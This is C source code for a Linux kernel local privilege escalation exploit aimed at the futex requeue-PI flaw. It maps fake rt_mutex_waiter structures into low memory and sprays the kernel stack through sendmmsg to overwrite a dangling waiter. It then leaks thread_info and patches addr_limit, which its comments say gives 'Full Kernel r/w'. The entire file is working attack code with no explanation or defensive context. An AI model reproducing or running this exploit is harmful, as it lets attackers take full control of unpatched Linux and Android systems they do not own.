#include <stdio.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <sys/resource.h>

#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_CMP_REQUEUE_PI    12

struct task_struct {};

struct mmsghdr {
        struct msghdr msg_hdr;
        unsigned msg_len;
};

struct list_head {
        struct list_head *next, *prev;
};

struct plist_node {
        int prio;
        struct list_head prio_list;
        struct list_head node_list;
};

struct plist_head {
        struct list_head node_list;
};

struct rt_mutex {
        struct plist_head   wait_list;
        struct task_struct  *owner;
};

struct rt_mutex_waiter {
        struct plist_node   list_entry;
        struct plist_node   pi_list_entry;
        struct task_struct  *task;
        struct rt_mutex     *lock;
};

int A = 0, B = 0;

#define OVFSIZE 128
#define MMAPED 0x202000

static int lock = 0;
static int addr_limit = 0;

void *padding_thread( void* e )
{
        while(1) sleep(1000000);
}

void *exploit_thread( void* e )
{
        int prio = (int)e;
        setpriority(PRIO_PROCESS, 0, prio);
        syscall(__NR_futex, &B, FUTEX_LOCK_PI, 1, 0, NULL, 0);
}

void* thread( void *e )
{

        struct mmsghdr mhdr[1];
        struct iovec msg[8];
        char databuf[OVFSIZE];
        struct sockaddr_in sa;

        lock = 1;

        //int sockfd = socket( AF_INET, SOCK_DGRAM, IPPROTO_UDP );
        //int sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
        int sockfd = socket( AF_INET, SOCK_DGRAM, 0 );
        if ( sockfd == -1 ) { printf("Socket create error\n"); exit(-1); }

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        sa.sin_port = htons(9999);

        if ( connect( sockfd, (struct sockaddr *) &sa, sizeof(sa)) == -1 )
        { printf("Connect error\n"); exit(-1); }

        memset( databuf, 0x44, sizeof(databuf) );

        int i;
        for( i = 0; i < 8; i++ )
        {
                msg[i].iov_base = &databuf;
                msg[i].iov_len = 0x10;
        }

        // In rt_mutex_adjust_prio_chain()
        //                    +-----  Where Overwrited rt_waiter Stored
        //                    |
        // waiter = task->pi_blocked_on
        // fake node_list & prio_list to a place other than "lock"
        msg[6].iov_base = 120;
        msg[6].iov_len  = MMAPED + 0x300;
        msg[7].iov_base = MMAPED + 0x300;
        msg[7].iov_len  = MMAPED + 0x308;
        *(int*)&databuf[0] = MMAPED + 0x308;

        // lock = waiter->lock ( waiter + 0x2c )
        *(int*)&databuf[0x1c] = MMAPED;

        mhdr[0].msg_hdr.msg_name = databuf;
        mhdr[0].msg_hdr.msg_namelen = sizeof(databuf);
        mhdr[0].msg_hdr.msg_iov = msg;
        mhdr[0].msg_hdr.msg_iovlen = 8;
        mhdr[0].msg_hdr.msg_control = NULL;
        mhdr[0].msg_hdr.msg_controllen = 0;
        mhdr[0].msg_hdr.msg_flags = 0;
        mhdr[0].msg_len = 0;

        lock = 0;

        syscall(__NR_futex, &A, FUTEX_WAIT_REQUEUE_PI, 0, 0, &B, 0);

        printf("Thread Waken!\n");

        while(lock) sleep(1);
        lock = 1;

        syscall( __NR_sendmmsg, sockfd, mhdr, 1, 0 );

        printf( "Sendmmsg Done!\n" );

        lock = 0;

        // Redo couple of times to get stable
        syscall( __NR_sendmmsg, sockfd, mhdr, 1, 0 );
        syscall( __NR_sendmmsg, sockfd, mhdr, 1, 0 );
        syscall( __NR_sendmmsg, sockfd, mhdr, 1, 0 );
        syscall( __NR_sendmmsg, sockfd, mhdr, 1, 0 );

        while(!addr_limit)  sleep(1);
        lock = 1;
        int al = addr_limit;

        // Prepare new prio_list 
        // iov_len will be checked & set against 0x7fffffff
        // add addr_limit by 1 to overwrite to bypass this
        // 0xfff000 should be sure to map
        msg[6].iov_len  = 0xffff00;
        msg[7].iov_base = al + 1;
        // Prepare new node_list
        msg[7].iov_len  = 0xffff00;
        *(int*)&databuf[0] = al + 1;

        syscall( __NR_sendmmsg, sockfd, mhdr, 1, 0 );

        lock = 0;

        // Redo couple of times to get stable
        syscall( __NR_sendmmsg, sockfd, mhdr, 1, 0 );
        syscall( __NR_sendmmsg, sockfd, mhdr, 1, 0 );
        syscall( __NR_sendmmsg, sockfd, mhdr, 1, 0 );
        syscall( __NR_sendmmsg, sockfd, mhdr, 1, 0 );

        while(lock) sleep(1);
        sleep(1);

        // Now Full Kernel r/w
        int ts, pipefd[2];
        pipe(pipefd);
        write(pipefd[1], al + 4, 4);
        read(pipefd[0], &ts, 4);
        printf("task_struct at : %p\n", ts);

        while(1) sleep(1);

        return e;
}

int main()
{
        printf("Start\n");

        void *ptr = mmap(MMAPED, 0x1000, 7, 0x21, 0, 0);

        if (ptr == (void*)-1) { printf("Mmap Failed: %d\n", errno);   return -1; }

        printf("Mmap Succeed: %p\n", ptr);

        ptr = mmap(0xfff000, 0x1000, 7, 0x21, 0, 0);

        if (ptr == (void*)-1) { printf("Mmap Failed: %d\n", errno);   return -1; }

        printf("Mmap Succeed: %p\n", ptr);

        // Test Mapping
        *(int*)ptr = 0x20202020;

        // Fake next & prev rt_mutex_waiter
        // Bypass Check: rt_mutex_top_waiter    BUG_ON(w->lock != lock);
        struct rt_mutex_waiter *rtwaiter = MMAPED + 0x100;
        struct rt_mutex_waiter *rtwaiter2 = MMAPED + 0x200;

        rtwaiter->lock = MMAPED;
        rtwaiter->list_entry.prio = 0;
        rtwaiter->list_entry.node_list.next = &rtwaiter2->list_entry.node_list;
        rtwaiter->list_entry.node_list.prev = MMAPED;
        rtwaiter->list_entry.prio_list.next = &rtwaiter2->list_entry.prio_list;
        rtwaiter->list_entry.prio_list.prev = &rtwaiter2->list_entry.prio_list;
        
        rtwaiter2->lock = MMAPED;
        rtwaiter2->list_entry.prio = 200;
        rtwaiter2->list_entry.node_list.next = MMAPED;
        rtwaiter2->list_entry.node_list.prev = &rtwaiter->list_entry.node_list;
        rtwaiter2->list_entry.prio_list.next = &rtwaiter->list_entry.prio_list;
        rtwaiter2->list_entry.prio_list.prev = &rtwaiter->list_entry.prio_list;

        // Fake rt_mutex
        // Set owner to 0, goto out_put_task
        ((struct rt_mutex*)MMAPED)->wait_list.node_list.next = &rtwaiter->list_entry.node_list;
        ((struct rt_mutex*)MMAPED)->wait_list.node_list.prev = &rtwaiter2->list_entry.node_list;
        ((struct rt_mutex*)MMAPED)->owner = 0;

        syscall( __NR_futex, &B, FUTEX_LOCK_PI, 1, 0, NULL, 0);
        printf("Futex B: %d\n", B);

        pthread_t t;
        pthread_create( &t, NULL, thread, NULL);

        printf("Main Waiting...\n");

        sleep(1);
        while(lock) sleep(1);
        lock = 1;

        syscall(__NR_futex, &A, FUTEX_CMP_REQUEUE_PI, 1, 0, &B, A);

        B = 0;
        syscall(__NR_futex, &B, FUTEX_CMP_REQUEUE_PI, 1, 0, &B, B);

        lock = 0;

        sleep(1);
        while(lock) sleep(1);
        lock = 1;

        printf("Futex B: %d\n", B);
        printf("Futex A: %d\n", A);

        // exploit_thread prio should set in descend order
        // to bypass 
        // rt_mutex_adjust_prio_chain():
        // if (top_waiter && (!task_has_pi_waiters(task) ||
        //            top_waiter != task_top_pi_waiter(task)))
        //     goto out_unlock_pi;
        printf("Start InfoLeak...\n");
        pthread_t lt;
        pthread_create( &lt, NULL, exploit_thread, 1);

        lock = 0;
        sleep(1);

        int ti = *(int*)(MMAPED+0x104) & 0xffffe000;
        addr_limit = ti + 8;
        printf("thread_info: %p\n", ti);

        // Fix faked list
        rtwaiter->list_entry.node_list.next = &rtwaiter2->list_entry.node_list;
        rtwaiter->list_entry.prio_list.next = &rtwaiter2->list_entry.prio_list;
        rtwaiter2->list_entry.node_list.prev = &rtwaiter->list_entry.node_list;
        rtwaiter2->list_entry.prio_list.prev = &rtwaiter->list_entry.prio_list;

        sleep(1);
        while(lock) sleep(1);
        lock = 1;

        // Kernel Write
        pthread_t wt;
        pthread_create( &wt, NULL, exploit_thread, 0);

        lock = 0;

        printf("addr_limit Patched!\n");

        while(1) sleep(1);

        return 0;
}

